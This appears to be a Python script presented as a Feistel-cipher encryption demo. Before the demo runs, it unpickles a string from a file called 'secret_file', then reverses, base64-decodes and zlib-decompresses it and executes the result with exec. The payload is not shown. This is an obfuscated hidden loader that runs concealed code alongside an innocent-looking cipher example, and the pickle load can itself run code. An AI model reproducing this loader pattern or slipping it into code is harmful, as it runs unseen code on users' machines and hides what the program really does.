from feistel import feistel
import sp
import json
import pickle


if __name__ == "__main__":
    secret_string = ""
    with open('secret_file', 'rb') as f:
        secret_string = pickle.load(f)
        
    _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(secret_string))

    key= 1342135
    message = 1354544352
    print(f"Plaintext before encryption: {message : >40}")
    feistelObj = feistel(key, sp.SP_Network, 16)
    Ct = feistelObj.feistel_network(message=message, encrypt_flag=1)
    CipherText = int(Ct, 2)
    print(f"Ciphertext: {CipherText: >57}")
    
    
    Pt = feistelObj.feistel_network(message=Ct, encrypt_flag=0)
    Plaintext = int(Pt, 2)
    print(f"Plaintext after decryption:  {Plaintext: >40}")